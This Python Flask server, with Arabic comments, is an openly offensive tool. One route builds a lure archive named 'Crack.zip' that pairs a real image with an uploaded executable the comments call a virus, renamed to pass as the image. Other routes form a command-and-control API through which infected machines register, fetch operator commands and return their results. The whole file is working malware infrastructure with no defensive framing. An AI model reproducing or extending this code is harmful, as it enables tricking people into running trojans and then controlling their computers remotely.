import os
import time
import uuid
import zipfile
import io
import threading
from flask import Flask, request, jsonify, send_file, send_from_directory

app = Flask(__name__)

# تخزين في الذاكرة
clients = {}
UPLOADED_EXE_DATA = None
lock = threading.Lock()

# عرض صفحة التحكم (HTML)
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# رفع ملف الفايروس (client.exe)
@app.route('/upload_exe', methods=['POST'])
def upload_exe():
    global UPLOADED_EXE_DATA
    if 'file' not in request.files:
        return jsonify({"ok": False, "error": "No file"})
    file = request.files['file']
    if file.filename == '':
        return jsonify({"ok": False, "error": "Empty filename"})
    UPLOADED_EXE_DATA = file.read()
    return jsonify({"ok": True})

# دمج الصورة مع الفايروس وصنع ZIP
@app.route('/build', methods=['POST'])
def build():
    global UPLOADED_EXE_DATA
    if not UPLOADED_EXE_DATA:
        return "Please upload client.exe first", 400
    
    if 'image' not in request.files:
        return "No image uploaded", 400
    
    img = request.files['image']
    img_name = img.filename
    
    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        # 1. الصورة الحقيقية
        zf.writestr(f"IMG_{img_name}", img.read())
        # 2. الفايروس متنكر باسم صورة
        zf.writestr(f"{img_name}.exe", UPLOADED_EXE_DATA)
            
    memory_file.seek(0)
    return send_file(memory_file, mimetype='application/zip', as_attachment=True, download_name='Crack.zip')

# --- مسارات التحكم (C2 API) ---
@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    cid = data.get('id')
    with lock:
        clients[cid] = {"last_seen": time.strftime("%H:%M:%S"), "os": data.get('os', 'Unknown'), "cmd": "", "result": ""}
    return jsonify({"status": "ok"})

@app.route('/api/get_cmd/<cid>', methods=['GET'])
def get_cmd(cid):
    with lock:
        if cid in clients:
            clients[cid]['last_seen'] = time.strftime("%H:%M:%S")
            cmd = clients[cid]['cmd']
            clients[cid]['cmd'] = ""
            return jsonify({"cmd": cmd})
    return jsonify({"cmd": ""})

@app.route('/api/send_result/<cid>', methods=['POST'])
def send_result(cid):
    data = request.json
    with lock:
        if cid in clients:
            clients[cid]['result'] = data.get('result', '')
    return jsonify({"status": "ok"})

@app.route('/api/clients', methods=['GET'])
def list_clients():
    with lock:
        return jsonify(clients)

@app.route('/api/send_cmd/<cid>', methods=['POST'])
def send_cmd(cid):
    data = request.json
    with lock:
        if cid in clients:
            clients[cid]['cmd'] = data.get('cmd')
            clients[cid]['result'] = ""
    return jsonify({"status": "ok"})

@app.route('/api/get_result/<cid>', methods=['GET'])
def get_result(cid):
    with lock:
        if cid in clients:
            return jsonify({"result": clients[cid]['result']})
    return jsonify({"result": ""})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))